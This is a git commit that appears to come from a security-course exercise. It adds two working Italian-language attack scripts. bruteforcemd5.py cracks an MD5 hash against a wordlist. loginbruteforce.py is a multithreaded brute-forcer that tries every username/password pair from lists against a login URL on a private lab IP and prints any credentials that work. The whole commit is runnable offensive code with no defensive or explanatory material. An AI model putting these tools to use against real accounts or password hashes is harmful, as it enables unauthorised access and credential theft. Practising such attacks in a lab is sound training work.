a78c28ee4fe8a5761ef9271098e135c03f695fc4
Bianca Muni <bmuni@c1r2p10.42firenze.it>
2026-05-15 15:40:25 +0200

    scripts

---
+++ bruteforcemd5.py
@@ -0,0 +1,35 @@
+import hashlib
+import sys
+import os
+
+#   python3 bruteforcemd5.py <hash> <wordlist>
+
+if len(sys.argv) != 3:
+    print("python3 bruteforcemd5.py <hash_md5> <wordlist>")
+    sys.exit(1)
+
+target_hash = sys.argv[1].lower()
+wordlist_path = sys.argv[2]
+
+if not os.path.exists(wordlist_path):
+    print(f"Wordlist non trovata: {wordlist_path}")
+    sys.exit(1)
+
+print("Avvio dictionary attack...")
+print(f"Hash target: {target_hash}")
+print(f"Wordlist: {wordlist_path}")
+
+found = False
+
+with open(wordlist_path, "r", encoding="latin-1") as file:
+    for line in file:
+        password = line.strip()
+        md5_hash = hashlib.md5(password.encode()).hexdigest()
+        if md5_hash == target_hash:
+            print("\nPASSWORD TROVATA!")
+            print(f"Password: {password}")
+            found = True
+            break
+
+if not found:
+    print("\nPassword non trovata nella wordlist.")
---
+++ loginbruteforce.py
@@ -0,0 +1,63 @@
+import requests
+from concurrent.futures import ThreadPoolExecutor
+import threading
+
+TARGET_URL = "http://10.11.249.19/index.php?page=signin&Login=Login"
+USERNAME_FIELD = "username"
+PASSWORD_FIELD = "password"
+USERLIST = ""
+PASSLIST = ""
+THREADS = 5
+FAIL_STRING = "WrongAnswer.gif"
+
+session = requests.Session()
+found_event = threading.Event()
+
+def attempt_login(username, password):
+
+    if found_event.is_set():
+        return
+    try:
+        response = session.get(
+            f"{TARGET_URL}&{USERNAME_FIELD}={username}&{PASSWORD_FIELD}={password}",
+            timeout=5
+        )
+        if FAIL_STRING not in response.text:
+            print("\nPASSWORD TROVATA!")
+            print(f"Username: {username}")
+            print(f"Password: {password}")
+            found_event.set()
+            return True
+
+    except Exception as e:
+        print(f"[!] Errore: {e}")
+
+    return False
+
+
+def worker(combo):
+    if found_event.is_set():
+        return
+    username, password = combo
+    attempt_login(username, password)
+
+def load_file(path):
+    with open(path, "r", encoding="latin-1") as f:
+        return [line.strip() for line in f if line.strip()]
+
+def main():
+    usernames = load_file(USERLIST)
+    passwords = load_file(PASSLIST)
+    combos = []
+    for u in usernames:
+        for p in passwords:
+            combos.append((u, p))
+    print(f"Tentativi totali: {len(combos)}")
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        for combo in combos:
+            if found_event.is_set():
+                break
+            executor.submit(worker, combo)
+
+if __name__ == "__main__":
+    main()
